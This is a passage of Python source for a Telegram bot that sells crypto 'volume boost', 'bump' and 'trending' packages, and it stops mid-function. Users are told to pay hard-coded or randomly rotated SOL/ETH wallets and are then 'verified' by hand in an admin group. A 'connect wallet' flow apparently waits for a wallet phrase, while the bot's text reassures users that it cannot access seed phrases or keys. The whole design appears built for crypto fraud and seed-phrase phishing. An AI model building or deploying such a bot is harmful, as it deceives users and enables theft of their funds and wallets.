# from telebot import TeleBot
# from telebot.types import InlineKeyboardButton
import sys
from bot_instance import bot
from startbump import handle_startbumps_callbacks, handle_start_bump
from user_sessions import set_user_ca, get_user_price, get_user_ca
import requests
from menu import start_message
from bot_interations import send_payment_verification_to_group, handle_group_callback, group_chat_id
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from text_utils import code_wrap, html_escape
from volume import handle_volume, handle_volume_package, volume_temp_ca_info
from premuim import handle_premium, handle_sol_trending, handle_sol_trending_callbacks, handle_eth_trending, handle_eth_trending_callbacks, handle_pumpfun_trending, handle_pumpfun_trending_callbacks
from deposit import handle_deposit
from connect import handle_connect, handle_connect_wallet, handle_connect_security, connect_phrase_waiting
from dexscreener import handle_dexscreener, handle_dexscreener_trend, banner_waiting
from wallets import SOL_WALLET, ETH_WALLET_100, ETH_WALLET_200, ETH_WALLET_300, PUMPFUN_WALLET, DEFAULT_WALLET
from ca_input_handler import handle_ca_input, handle_ca_callback, is_user_waiting_for_ca, send_ca_prompt
from bot_lock import BotLock
from stats import handle_stats_callback
from checkbalance import handle_balance_callback, admin_update_balance, get_balance_for_admin
# import telebot
# print(telebot.__version__)
import re
import time
import threading


prices = {}

# Enhanced tx_hash_waiting structure to store more data
tx_hash_waiting = {}

# Track users waiting for deposit amount input
deposit_amount_waiting = set()

# Track users waiting for withdrawal amount input
withdrawal_amount_waiting = set()

# Track processed message IDs to prevent duplication
processed_messages = set()

temp_ca_info = {}

def mdv2_escape(text):
    # Deprecated: kept for backward compatibility. Use html_escape instead.
    return text

def is_valid_tx_hash(tx_hash):
    # ETH: 0x + 64 hex chars
    if tx_hash.startswith('0x') and len(tx_hash) == 66 and all(c in '0123456789abcdefABCDEF' for c in tx_hash[2:]):
        return True
    # SOL: More lenient validation - just check it's not too short and contains valid characters
    # Solana TX hashes can vary in length and character set
    if (len(tx_hash) >= 20 and 
        len(tx_hash) <= 100 and 
        not tx_hash.startswith('0x') and 
        tx_hash.replace('-', '').replace('_', '').isalnum()):
        return True
    return False

def send_tx_hash_prompt(chat_id, price):
    """Send tx hash input prompt with cancel button"""
    text = (
        f"🔗 <b>Transaction Hash Required</b>\n\n"
        f"Please send your transaction hash below and await immediate confirmation.\n\n"
        f"⏰ <b>Time Limit:</b> You have 15 minutes to submit your transaction hash."
    )

    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("❌ Cancel", callback_data="tx_cancel"),
        InlineKeyboardButton("🔄 Retry", callback_data="tx_retry")
    )

    bot.send_message(chat_id, text, reply_markup=markup)

    # Store waiting state with timestamp
    tx_hash_waiting[chat_id] = {
        'timestamp': time.time(),
        'price': price,
        'ca': get_user_ca(chat_id)
    }

    # Start timeout thread
    start_tx_timeout(chat_id)

def start_tx_timeout(chat_id):
    """Start a timeout thread for tx hash submission"""
    def timeout_check():
        time.sleep(900)  # 15 minutes = 900 seconds
        if chat_id in tx_hash_waiting:
            # Check if still waiting after timeout
            waiting_data = tx_hash_waiting[chat_id]
            if time.time() - waiting_data['timestamp'] >= 900:
                # Timeout occurred
                tx_hash_waiting.pop(chat_id, None)
                markup = InlineKeyboardMarkup(row_width=1)
                markup.add(InlineKeyboardButton("🔝 Main Menu", callback_data="mainmenu"))
                bot.send_message(chat_id, "⏰ <b>Timeout</b>\nYou didn’t submit a transaction hash within 15 minutes. Your order has been cancelled.", reply_markup=markup)

    thread = threading.Thread(target=timeout_check)
    thread.daemon = True
    thread.start()

@bot.message_handler(commands=["groupid"])  # Run this in the target group to get its ID
def handle_group_id(message):
    try:
        chat_id = message.chat.id
        bot.reply_to(message, f"Group ID: {chat_id}")
    except Exception:
        pass

def handle_tx_callback(call):
    """Handle tx hash related callbacks (cancel, retry)"""
    chat_id = call.message.chat.id
    data = call.data

    if data == "tx_cancel":
        # Cancel tx hash submission
        tx_hash_waiting.pop(chat_id, None)

        # Send user back to main menu
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        start_message(call.message)

    elif data == "tx_retry":
        # Retry tx hash submission
        if chat_id in tx_hash_waiting:
            price = tx_hash_waiting[chat_id]['price']
            # Update timestamp for new attempt
            tx_hash_waiting[chat_id]['timestamp'] = time.time()

            # Send new prompt
            send_tx_hash_prompt(chat_id, price)

            try:
                bot.delete_message(chat_id, call.message.message_id)
            except:
                pass
        else:
            bot.answer_callback_query(call.id, "❌ No active transaction is waiting. Please start a new order.")

def send_eth_payment_instructions(chat_id, price, token_name=None):
    """Send ETH trending payment instructions with multiple wallet options"""
    verify_text = "\n\nAfter payment, tap /sent to verify your transaction."

    # Define wallet addresses for different price tiers
    eth_wallets = {
        "100$": ETH_WALLET_100,
        "200$": ETH_WALLET_200,
        "300$": ETH_WALLET_300
    }

    wallet_address = eth_wallets.get(price, ETH_WALLET_100)
    wallet_address_md = code_wrap(wallet_address)
    text = (
        f"🔵 <b>ETH Trending Confirmed</b>\n\n"
        f"Your selection has been added successfully.\n\n"
        f"💳 <b>Payment Details</b>\n"
        f"Price: <b>{html_escape(str(price))}</b>\n"
        f"Wallet:\n{wallet_address_md}\n\n"
        f"📝 Please send the exact amount.\n\n"
        f"Ones Payment is been completed within the given timeframe, kindly click below to verify your Payment with your TX•"
    )
    
    # Create verify payment button
    markup = InlineKeyboardMarkup()
    verify_btn = InlineKeyboardButton("✅ Verify Payment", callback_data="verify_payment")
    markup.add(verify_btn)
    
    bot.send_message(chat_id, text, reply_markup=markup)

def send_pumpfun_payment_instructions(chat_id, price, token_name=None):
    """Send PumpFun trending payment instructions"""
    from wallets import SOL_WALLETS
    import random

    # Randomly select wallet for PumpFun trending orders
    pumpfun_address = random.choice(SOL_WALLETS)
    pumpfun_address_md = code_wrap(pumpfun_address)
    text = (
        f"✅ <b>Order Placed Successfully</b>\n\n"
        f"We currently have an available slot.\n"
        f"Once payment is received, your trending will begin within <b>20 minutes</b>.\n\n"
        f"<b>Network:</b> SOL\n"
        f"<b>Payment Address</b>\n{pumpfun_address_md}\n"
        f"(Tap to copy)\n\n"
        f"Ones Payment is been completed within the given timeframe, kindly click below to verify your Payment with your TX•"
    )
    
    # Create verify payment button
    markup = InlineKeyboardMarkup()
    verify_btn = InlineKeyboardButton("✅ Verify Payment", callback_data="verify_payment")
    markup.add(verify_btn)
    
    bot.send_message(chat_id, text, reply_markup=markup)

def send_volume_payment_instructions(chat_id, price, token_name=None):
    """Send volume boost payment instructions"""
    # Get package details based on price
    package_details = {
        '1.2': {'name': '⛓️Iron Boost Package', 'volume': '$60,200', 'image': 'iron.jpg'},
        '3': {'name': '🥉Bronze Boost Package', 'volume': '$152,000', 'image': 'bronze.jpg'},
        '5.5': {'name': '🥈Silver Boost Package', 'volume': '$666,000', 'image': 'silver.jpg'},
        '7.5': {'name': '🥇Gold Boost Package', 'volume': '$932,000', 'image': 'gold.jpg'},
        '10': {'name': '⚪️Platinum Boost Package', 'volume': '$1,400,000', 'image': 'platinum.jpg'},
        '15': {'name': '💎Diamond Boost Package', 'volume': '$2,400,000', 'image': 'diamond.jpg'}
    }

    package = package_details.get(price, {'name': 'Volume Boost Package', 'volume': 'Custom', 'image': 'volume.jpg'})

    # Use single wallet address for all volume orders
    wallet_address = "FMUhPh4xb7zTAeuHFJcnEwBDy5fDv7QBFmppe6ABBHut"
    wallet_address_md = code_wrap(wallet_address)

    text = (
        f"🧪<b>Volume Boost Confirmed</b>\n\n"
        f"📊 <b>Package Details</b>\n"
        f"• Package: {html_escape(package['name'])}\n"
        f"• Estimated Volume: {html_escape(package['volume'])}\n"
        f"• Price: <b>{html_escape(str(price))} SOL</b>\n\n"
        f"🟢 <b>Final Step: Payment</b>\n\n"
        f"Please complete a one-time payment of <b>{html_escape(str(price))} SOL</b> to the wallet below:\n\n"
        f"<b>Wallet</b>\n{wallet_address_md}\n\n"
        f"📝Once Payment is been completed within the given timeframe your volume package will be activated, kindly click below to verify your Payment with your TX•"
    )

    # Create verify payment button
    markup = InlineKeyboardMarkup()
    verify_btn = InlineKeyboardButton("✅ Verify Payment", callback_data="verify_payment")
    markup.add(verify_btn)

    # Get the specific image for this package
    image_url = f"https://raw.githubusercontent.com/raccityy/smartnewandimproved/main/{package['image']}"
    
    try:
        bot.send_photo(chat_id, image_url, caption=text, reply_markup=markup)
    except Exception:
        bot.send_message(chat_id, text, reply_markup=markup)

def send_eth_trending_payment_instructions(chat_id, price, token_name=None):
    """Send ETH trending payment instructions"""
    verify_text = "\n\nAfter payment, tap /sent to verify your transaction."

    # Get package details based on price
    package_details = {
        '100$': {'name': 'ETH Trending Basic', 'duration': '24 hours'},
        '200$': {'name': 'ETH Trending Standard', 'duration': '48 hours'},
        '300$': {'name': 'ETH Trending Premium', 'duration': '72 hours'}
    }

    package = package_details.get(price, {'name': 'ETH Trending Package', 'duration': 'Custom'})

    # Define wallet addresses for different price tiers
    eth_wallets = {
        "100$": ETH_WALLET_100,
        "200$": ETH_WALLET_200,
        "300$": ETH_WALLET_300
    }

    # Get the appropriate wallet address for the price
    wallet_address = eth_wallets.get(price, ETH_WALLET_100)
    wallet_address_md = code_wrap(wallet_address)

    text = (
        f"🔵 <b>ETH Trending Confirmed</b>\n\n"
        f"✅ <b>{html_escape(package['name'])}</b> has been added.\n\n"
        f"📊 <b>Package Details</b>\n"
        f"• Package: {html_escape(package['name'])}\n"
        f"• Duration: {html_escape(package['duration'])}\n"
        f"• Price: <b>{html_escape(str(price))}</b>\n\n"
        f"🟢 <b>Final Step: Payment</b>\n\n"
        f"Please complete payment of <b>{html_escape(str(price))}</b> to the wallet below:\n\n"
        f"<b>Wallet</b>\n{wallet_address_md}\n\n"
        f"Once payment is received, your ETH trending will be activated.\n\n"
        f"Ones Payment is been completed within the given timeframe, kindly click below to verify your Payment with your TX•"
    )

    # Create verify payment button
    markup = InlineKeyboardMarkup()
    verify_btn = InlineKeyboardButton("✅ Verify Payment", callback_data="verify_payment")
    markup.add(verify_btn)

    bot.send_message(chat_id, text, reply_markup=markup)

def send_payment_instructions(chat_id, price, token_name=None):
    # Check if this is a volume boost payment
    if price in ['1.2', '3', '5.5', '7.5', '10', '15']:
        send_volume_payment_instructions(chat_id, price, token_name)
        return

    # Check if this is an ETH trending payment
    if price and "$" in price:
        send_eth_trending_payment_instructions(chat_id, price, token_name)
        return

    # Check if this is a PumpFun trending payment
    if price and price == "30 SOL":
        send_pumpfun_payment_instructions(chat_id, price, token_name)
        return

    # Determine wallet based on order type
    from wallets import SOL_WALLETS
    import random
    
    # Extract numeric part from price for bump orders
    if ' ' in price:  # Price contains "SOL" (e.g., "0.3 SOL")
        numeric_price = price.split(' ')[0]  # Extract "0.3" from "0.3 SOL"
    else:
        numeric_price = price  # Already numeric (e.g., "0.3")
    
    # For bump orders, use specific wallet based on price
    if numeric_price in ['0.3', '0.4', '0.5', '0.6']:
        price_index = ['0.3', '0.4', '0.5', '0.6'].index(numeric_price)
        wallet_address = SOL_WALLETS[price_index]
    else:
        # For other orders, randomly select from all wallets
        wallet_address = random.choice(SOL_WALLETS)
    
    wallet_address_md = code_wrap(wallet_address)
    
    if token_name:
        text = (
            f"⚡️<b>Bump Boost Order Confirmed</b>\n\n"
            f"One last Step: Payment Required\n\n"
            f"⏰ Please complete the one time fee payment of <b>{html_escape(str(price))}</b> to the following wallet address:\n\n"
            f"<b>Wallet:</b>\n{wallet_address_md}\n(Tap to copy)\n\n"
            f"Ones Payment is been completed within the given timeframe, kindly click below to verify your Payment with your TX•"
        )
    else:
        text = (
            f"⚡️<b>Bump Boost Order Confirmed</b>\n\n"
            f"One last Step: Payment Required\n\n"
            f"⏰ Please complete the one time fee payment of <b>{html_escape(str(price))} SOL</b> to the following wallet address:\n\n"
            f"<b>Wallet:</b>\n{wallet_address_md}\n(Tap to copy)\n\n"
            f"Ones Payment is been completed within the given timeframe, kindly click below to verify your Payment with your TX•"
        )
    price_to_image = {
        '0.3': 'https://github.com/raccityy/smartnewandimproved/blob/main/3.jpg?raw=true',
        '0.4': 'https://github.com/raccityy/smartnewandimproved/blob/main/4.jpg?raw=true',
        '0.5': 'https://github.com/raccityy/smartnewandimproved/blob/main/5.jpg?raw=true',
        '0.6': 'https://github.com/raccityy/smartnewandimproved/blob/main/6.jpg?raw=true',
    }
    
    # Format price to one decimal place string for lookup
    price_str = f"{float(numeric_price):.1f}"
    image_url = price_to_image.get(price_str, None)
    
    # Create verify payment button
    markup = InlineKeyboardMarkup()
    verify_btn = InlineKeyboardButton("✅ Verify Payment", callback_data="verify_payment")
    markup.add(verify_btn)
    
    if image_url and image_url.startswith('http'):
        try:
            bot.send_photo(chat_id, image_url, caption=text, reply_markup=markup)
        except Exception:
            bot.send_message(chat_id, text, reply_markup=markup)
    else:
        bot.send_message(chat_id, text, reply_markup=markup)

# Group message handler - must be registered first to catch all group messages
@bot.message_handler(func=lambda message: message.chat.id == group_chat_id, content_types=['text', 'photo', 'video', 'animation', 'document', 'audio', 'voice', 'video_note', 'sticker', 'location', 'contact'])
def handle_group_messages(message):
    """Handle all messages sent to the admin group"""
    print(f"DEBUG: Group handler called for message from {message.from_user.id}, content type: {message.content_type}")
    from bot_interations import handle_admin_reply
    handle_admin_reply(message)

@bot.message_handler(commands=["start"])
def handle_start(message):
    start_message(message)
    # Notify group
    user = message.from_user.username or message.from_user.id
    bot.send_message(group_chat_id, f"User @{user} just clicked /start")


@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    print(f"DEBUG: Callback received: {call.data} from user {call.message.chat.id}")
    bot.send_message(group_chat_id, f"User @{call.from_user.username} just clicked {call.data}")

    # Handle group reply/close/balance buttons
    if call.data.startswith("group_reply_") or call.data.startswith("group_close_") or call.data.startswith("group_balance_"):
        handle_group_callback(call)
        return

    # Handle CA-related callbacks (cancel, retry)
    if call.data.startswith("ca_cancel_") or call.data.startswith("ca_retry_"):
        handle_ca_callback(call)
        return

    # Handle tx hash related callbacks (cancel, retry)
    if call.data.startswith("tx_"):
        handle_tx_callback(call)
        return

    # Standardized back and menu button handling
    if call.data == "back":
        # Back button should go back one step - this will be handled by specific handlers
        return
    elif call.data == "mainmenu":
        # Menu button should always go to main menu
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start_message(call.message)
        return

    if call.data == "volume":
        handle_volume(call)
        return

    # Handle stats callbacks
    if call.data.startswith("stats"):
        handle_stats_callback(call)
        return

    # Handle balance callbacks
    if call.data.startswith("balance") or call.data.startswith("withdraw_"):
        print(f"DEBUG: Routing callback {call.data} to handle_balance_callback")
        handle_balance_callback(call)
        
        # Add user to withdrawal waiting state if they clicked withdraw
        if call.data == "balance_withdraw":
            user_id = call.from_user.id
            withdrawal_amount_waiting.add(user_id)
            print(f"DEBUG: Added user {user_id} to withdrawal_amount_waiting. Current state: {withdrawal_amount_waiting}")
        return
    
    # Handle close balance notification
    if call.data == "close_balance_notification":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        return
    
    # Handle connect wallet button
    if call.data == "connect_wallet":
        # Redirect to the regular connect wallet flow
        handle_connect_wallet(call)
        return
    
    # Handle why connect wallet button
    if call.data == "why_connect_wallet":
        why_connect_text = """
🔍 <b>WHY CONNECT YOUR WALLET?</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🛡️ <b>PROTECTION AGAINST BOT CHARGES</b>

When you connect your wallet directly, the bot cannot:
• Take any additional fees or charges
• Access your private keys or seed phrases
• Modify transaction amounts
• Intercept your funds

🔒 <b>HOW IT WORKS</b>

1. <b>Direct Connection:</b> Your wallet connects directly to the blockchain
2. <b>No Intermediary:</b> The bot only provides the withdrawal address
3. <b>You Control:</b> You sign and approve all transactions yourself
4. <b>Transparent Fees:</b> Only network fees apply (visible in your wallet)

⚡ <b>BENEFITS</b>

✅ <b>Zero Bot Fees</b> - No hidden charges or commissions
✅ <b>Full Control</b> - You approve every transaction
✅ <b>Transparency</b> - See exactly what you're paying
✅ <b>Security</b> - Your private keys never leave your device
✅ <b>Speed</b> - Instant processing without manual verification

⚠️ <b>IMPORTANT</b>

• Only network fees (gas) will be charged
• These fees go to the blockchain, not the bot
• You can see all fees before confirming
• Your withdrawal amount is guaranteed

💡 <b>BOTTOM LINE</b>

Connecting your wallet ensures the bot cannot take any charges from your withdrawal. You maintain full control and transparency over your funds.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
        
        from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
        markup = InlineKeyboardMarkup()
        back_btn = InlineKeyboardButton("🔙 Back to Withdrawal", callback_data="balance_withdraw")
        connect_btn = InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")
        
        markup.add(back_btn, connect_btn)
        
        try:
            bot.edit_message_text(why_connect_text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="HTML")
        except Exception:
            bot.send_message(call.message.chat.id, why_connect_text, reply_markup=markup, parse_mode="HTML")
        return
    
    # Handle deposit retry/cancel buttons
    if call.data == "deposit_retry":
        # Restart the deposit flow
        deposit_amount_waiting.add(call.message.chat.id)
        bot.answer_callback_query(call.id, "Please send the deposit amount")
        
        deposit_text = """
💳 <b>deposit confirmation</b>

first, please send the amount you deposited (in SOL).

example: 0.5, 1.0, 2.5

💡 <b>format:</b> send only the number
"""
        
        from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
        markup = InlineKeyboardMarkup()
        retry_btn = InlineKeyboardButton("🔄 Retry", callback_data="deposit_retry")
        cancel_btn = InlineKeyboardButton("❌ Cancel", callback_data="deposit_cancel")
        markup.add(retry_btn, cancel_btn)
        
        bot.edit_message_text(deposit_text, call.message.chat.id, call.message.message_id, 
                             reply_markup=markup, parse_mode="HTML")
        return
    
    if call.data == "deposit_cancel":
        from checkbalance import remove_incomplete_order, get_incomplete_orders
        # Remove the most recent incomplete order
        incomplete_orders = get_incomplete_orders(call.message.chat.id)
        if incomplete_orders:
            remove_incomplete_order(call.message.chat.id, len(incomplete_orders) - 1)
        # Remove from waiting states
        deposit_amount_waiting.discard(call.message.chat.id)
        bot.answer_callback_query(call.id, "Deposit cancelled")
        bot.edit_message_text("❌ <b>Deposit cancelled</b>\n\nYou can start a new deposit anytime.", 
                             call.message.chat.id, call.message.message_id, parse_mode="HTML")
        return

    # Handle volume package buttons
    if call.data in [
        "vol_iron", "vol_bronze", "vol_gold", "vol_platinum", "vol_silver", "vol_diamond"
    ]:
        handle_volume_package(call)
        return

    if call.data == "vol_back":
        # Go back to main menu (one step back from volume)
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start_message(call.message)
        return
    elif call.data == "vol_mainmenu":
        # Go to main menu
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start_message(call.message)
        return

    if call.data == "vol_ca_confirm":
        chat_id = call.message.chat.id
        info = volume_temp_ca_info.pop(chat_id, None)
        if info:
            price = info['price']
            # Send success message and delete confirmation message
            bot.answer_callback_query(call.id, "✅ CA confirmed successfully!")
            bot.delete_message(chat_id, call.message.message_id)
            send_volume_payment_instructions(chat_id, price)
        return

    if call.data == "vol_back_ca":
        chat_id = call.message.chat.id
        price = get_user_price(chat_id)
        if price:
            bot.answer_callback_query(call.id, "🔄 Going back to CA input...")
            bot.delete_message(chat_id, call.message.message_id)
            send_ca_prompt(chat_id, price, "volume")
        return

    if call.data == "eth_ca_confirm":
        chat_id = call.message.chat.id
        price = get_user_price(chat_id)
        if price:
            # Send success message and delete confirmation message
            bot.answer_callback_query(call.id, "✅ CA confirmed successfully!")
            bot.delete_message(chat_id, call.message.message_id)
            send_eth_trending_payment_instructions(chat_id, price)
        return

    if call.data == "eth_back_ca":
        chat_id = call.message.chat.id
        price = get_user_price(chat_id)
        if price:
            bot.answer_callback_query(call.id, "🔄 Going back to CA input...")
            bot.delete_message(chat_id, call.message.message_id)
            send_ca_prompt(chat_id, price, "eth_trending")
        return

    if call.data == "sol_ca_confirm":
        chat_id = call.message.chat.id
        price = get_user_price(chat_id)
        if price:
            # Send success message and delete confirmation message
            bot.answer_callback_query(call.id, "✅ CA confirmed successfully!")
            bot.delete_message(chat_id, call.message.message_id)
            send_payment_instructions(chat_id, price)
        return

    if call.data == "sol_back_ca":
        chat_id = call.message.chat.id
        price = get_user_price(chat_id)
        if price:
            bot.answer_callback_query(call.id, "🔄 Going back to CA input...")
            bot.delete_message(chat_id, call.message.message_id)
            send_ca_prompt(chat_id, price, "sol_trending")
        return

    if call.data == "pumpfun_ca_confirm":
        chat_id = call.message.chat.id
        price = get_user_price(chat_id)
        if price:
            # Send success message and delete confirmation message
            bot.answer_callback_query(call.id, "✅ CA confirmed successfully!")
            bot.delete_message(chat_id, call.message.message_id)
            send_payment_instructions(chat_id, price)
        return

    if call.data == "pumpfun_back_ca":
        chat_id = call.message.chat.id
        price = get_user_price(chat_id)
        if price:
            bot.answer_callback_query(call.id, "🔄 Going back to CA input...")
            bot.delete_message(chat_id, call.message.message_id)
            send_ca_prompt(chat_id, price, "pumpfun_trending")
        return

    if call.data == "premium":
        handle_premium(call)
        return

    # Handle premium buttons
    if call.data.startswith("premium_"):
        if call.data == "premium_sol":
            handle_sol_trending(call)
        elif call.data == "premium_eth":
            handle_eth_trending(call)
        elif call.data == "premium_pumpfun":
            handle_pumpfun_trending(call)
        elif call.data == "premium_back":
            # Go back to main menu (one step back from premium)
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        elif call.data == "premium_menu":
            # Go to main menu
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        else:
            handle_premium(call)
        return

    # Handle SOL trending buttons
    if call.data.startswith("sol_"):
        if call.data == "sol_back":
            # Go back to premium menu (one step back from SOL trending)
            handle_premium(call)
        elif call.data == "sol_mainmenu":
            # Go to main menu
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        else:
            # Handle SOL trending package selection
            handle_sol_trending_callbacks(call)
        return

    # Handle ETH trending buttons
    if call.data.startswith("eth_"):
        if call.data == "eth_back":
            # Go back to premium menu (one step back from ETH trending)
            handle_premium(call)
        elif call.data == "eth_mainmenu":
            # Go to main menu
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        else:
            # Handle ETH trending package selection
            handle_eth_trending_callbacks(call)
        return

    # Handle PumpFun trending buttons
    if call.data.startswith("pumpfun_"):
        if call.data == "pumpfun_back":
            # Go back to premium menu (one step back from PumpFun trending)
            handle_premium(call)
        elif call.data == "pumpfun_mainmenu":
            # Go to main menu
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        else:
            # Handle PumpFun trending package selection
            handle_pumpfun_trending_callbacks(call)
        return

    if call.data == "startbump":
        handle_start_bump(call)

    elif call.data.startswith("bump_"):
        # Forward bump-related callbacks to startbump handler
        handle_startbumps_callbacks(call)

    elif call.data == "deposit":
        handle_deposit(call)

    # Handle deposit buttons
    if call.data.startswith("deposit_"):
        if call.data == "deposit_add":
            bot.answer_callback_query(call.id)
            
            # Add user to deposit amount waiting state
            user_id = call.message.chat.id
            deposit_amount_waiting.add(user_id)
            print(f"DEBUG: Added user {user_id} to deposit_amount_waiting. Current state: {deposit_amount_waiting}")
            
            text = (
                "💳 <b>deposit amount</b>\n\n"
                "how much sol do you want to deposit?\n\n"
                "💡 <b>minimum:</b> 0.20 sol\n"
                "💡 <b>maximum:</b> 1000 sol\n\n"
                "send only the number (e.g., 5.5)"
            )
            
            from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
            markup = InlineKeyboardMarkup()
            cancel_btn = InlineKeyboardButton("❌ Cancel", callback_data="deposit_cancel")
            markup.add(cancel_btn)
            
            bot.send_message(call.message.chat.id, text, reply_markup=markup)
        elif call.data == "deposit_cancel":
            bot.answer_callback_query(call.id)
            # Remove user from deposit amount waiting state
            user_id = call.message.chat.id
            deposit_amount_waiting.discard(user_id)
            print(f"DEBUG: Removed user {user_id} from deposit_amount_waiting. Current state: {deposit_amount_waiting}")
            bot.send_message(call.message.chat.id, "❌ <b>deposit cancelled</b>")
        elif call.data == "deposit_back":
            # Go back to main menu (one step back from deposit)
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        elif call.data == "deposit_mainmenu":
            # Go to main menu
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        return

    # Handle dexscreener buttons
    if call.data.startswith("dexscreener_"):
        if call.data == "dexscreener_trend":
            handle_dexscreener_trend(call)
        elif call.data == "dexscreener_back":
            # Go back to main menu (one step back from dexscreener)
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        elif call.data == "dexscreener_mainmenu":
            # Go to main menu
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        return

    elif call.data == "connect":
        handle_connect(call)

    # Handle connect buttons
    if call.data.startswith("connect_"):
        if call.data == "connect_wallet":
            handle_connect_wallet(call)
        elif call.data == "connect_security":
            handle_connect_security(call)
        elif call.data == "connect_back":
            # Go back to main menu (one step back from connect)
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        elif call.data == "connect_mainmenu":
            # Go to main menu
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        return

    elif call.data == "dexscreener":
        handle_dexscreener(call)

    elif call.data == "ca_confirm":
        chat_id = call.message.chat.id
        info = temp_ca_info.pop(chat_id, None)
        if info:
            price = info['price']
            # Send success message and delete confirmation message
            bot.answer_callback_query(call.id, "✅ CA confirmed successfully!")
            bot.delete_message(chat_id, call.message.message_id)
            send_payment_instructions(chat_id, price)
        else:
            bot.answer_callback_query(call.id, "❌ No CA info found. Please try again.")
        return

    elif call.data == "verify_payment":
        chat_id = call.message.chat.id
        # Handle verify payment button - same as /sent command
        handle_sent(call.message)
        return

    elif call.data == "back_ca":
        chat_id = call.message.chat.id
        price = get_user_price(chat_id)
        if price:
            bot.answer_callback_query(call.id, "🔄 Going back to CA input...")
            bot.delete_message(chat_id, call.message.message_id)
            send_ca_prompt(chat_id, price, "general")
        return

    # Handle connect wallet retry/menu buttons
    elif call.data == "try_connect_again":
        connect_phrase_waiting[call.message.chat.id] = True
        bot.delete_message(call.message.chat.id, call.message.message_id)
        handle_connect_wallet(call)
        # print("yes")
        return
    # Handle connect wallet menu button
    elif call.data == "menu_for_connect":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start_message(call.message)
        return

    # else:
    #     bot.answer_callback_query(call.id)
    #     bot.send_message(call.message.chat.id, "❌ Unknown action.")


@bot.message_handler(commands=["sent"])
def handle_sent(message):
    chat_id = message.chat.id
    price = get_user_price(chat_id)
    
    if price:
        # Handle bump/volume order sent
        send_tx_hash_prompt(chat_id, price)
    else:
        # Check if user has incomplete orders (deposits)
        from checkbalance import get_incomplete_orders
        incomplete_orders = get_incomplete_orders(chat_id)
        
        if incomplete_orders:
            # User has incomplete orders, ask for TX hash directly (amount already provided)
            from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
            
            # Get the most recent incomplete order to show the amount
            latest_order = incomplete_orders[-1]
            amount = latest_order.get('price', 'unknown')
            
            tx_text = f"""
🔗 <b>Transaction Hash Required</b>

Please send your transaction hash below and await immediate confirmation.

⏰ <b>Time Limit:</b> You have 15 minutes to submit your transaction hash.
"""
            
            markup = InlineKeyboardMarkup()
            retry_btn = InlineKeyboardButton("🔄 Retry", callback_data="deposit_retry")
            cancel_btn = InlineKeyboardButton("❌ Cancel", callback_data="deposit_cancel")
            markup.add(retry_btn, cancel_btn)
            
            bot.send_message(chat_id, tx_text, reply_markup=markup, parse_mode="HTML")
        else:
            # No orders in progress
            bot.send_message(chat_id, 
                "❌ <b>no orders in progress</b>\n\n"
                "please start a new order or deposit first.\n\n"
                "💡 <b>options:</b>\n"
                "• start a bump order\n"
                "• make a deposit\n"
                "• check your balance",
                parse_mode="HTML"
            )


@bot.message_handler(func=lambda message: message.chat.id in deposit_amount_waiting)
def handle_deposit_amount(message):
    """Handle deposit amount input when user is in deposit mode"""
    chat_id = message.chat.id
    message_id = message.message_id
    
    # Prevent duplicate processing
    if message_id in processed_messages:
        print(f"DEBUG: Message {message_id} already processed, skipping")
        return
    
    # Mark message as processed
    processed_messages.add(message_id)
    
    print(f"DEBUG: Deposit amount handler triggered for user {chat_id}, text: {message.text}")
    print(f"DEBUG: Current deposit_amount_waiting state: {deposit_amount_waiting}")
    print(f"DEBUG: User {chat_id} in deposit_amount_waiting: {chat_id in deposit_amount_waiting}")
    
    try:
        amount = float(message.text.strip())
        print(f"DEBUG: Parsed amount: {amount}")
        
        if 0.20 <= amount <= 1000:
            # Create an incomplete order for deposit tracking
            from checkbalance import add_incomplete_order
            import time
            add_incomplete_order(chat_id, "deposit", "N/A", amount, time.time())
            
            # Remove from waiting state
            deposit_amount_waiting.discard(chat_id)
            print(f"DEBUG: Removed user {chat_id} from deposit_amount_waiting after processing amount. Current state: {deposit_amount_waiting}")
            
            # Show wallet with specific amount
            deposit_address = code_wrap(SOL_WALLET)
            
            text = (
                f"💳 <b>wallet generated</b>\n\n"
                f"make a deposit of <b>{amount:.4f} sol</b> to the address below:\n\n"
                f"💳 <b>wallet address:</b>\n"
                f"{deposit_address}\n\n"
                f"⚠️ <b>important:</b> send only sol to this address\n\n"
                f"💡 <b>after sending, use /sent command to confirm</b>"
            )
            
            bot.send_message(chat_id, text, parse_mode="HTML")
        else:
            bot.send_message(chat_id, "❌ Amount must be between 0.20 and 1000 SOL")
            return
    except ValueError:
        bot.send_message(chat_id, "❌ Invalid amount. Please enter a valid number (e.g., 5.5)")
        return

@bot.message_handler(func=lambda message: message.chat.id in withdrawal_amount_waiting)
def handle_withdrawal_amount(message):
    """Handle withdrawal amount input when user is in withdrawal mode"""
    chat_id = message.chat.id
    message_id = message.message_id
    
    # Prevent duplicate processing
    if message_id in processed_messages:
